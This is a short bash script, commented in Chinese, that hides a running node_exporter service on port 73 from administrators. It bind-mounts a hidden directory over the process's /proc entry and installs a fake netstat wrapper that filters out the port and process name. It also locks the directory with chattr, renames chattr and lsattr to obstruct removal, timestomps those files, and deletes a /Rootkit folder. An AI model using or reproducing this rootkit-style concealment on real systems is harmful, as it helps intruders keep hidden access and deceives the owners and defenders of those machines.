#!/bin/bash
#@  node_exporter 隐藏
#cat /proc/$$/mountinfo|grep so
# umount /usr/lib/x86_64-linux-gnu/.libexhiports.so.6.0

pid=$(
    nohup /usr/lib/dataFile/node_exporter --web.listen-address=":73" >/dev/null 2>&1 &
    echo $!
)
src_file="/lib/x86_64-linux-gnu/.libexhiports.so.6.0"
mkdir -p $src_file

cat >/usr/local/bin/netstat <<EOF
#!/bin/bash

if ! command -v /usr/bin/netstat >/dev/null 2>&1; then
    echo "bash: netstat: command not found"

    exit 127
fi

/usr/bin/netstat \$@ | grep -Ev "0.0.0.0:73|:::73|node_exporter"





EOF

chmod 755 /usr/local/bin/netstat

mount -o bind ${src_file} /proc/${pid}
chattr +a ${src_file}
mv /usr/bin/chattr /usr/bin/cht || echo 0
mv /usr/bin/lsattr /usr/bin/lst || echo 0
touch -acmr /bin/ls /usr/bin/cht || echo 0
touch -acmr /bin/ls /usr/bin/lst || echo 0
echo "进程号"$pid
rm -rf /Rootkit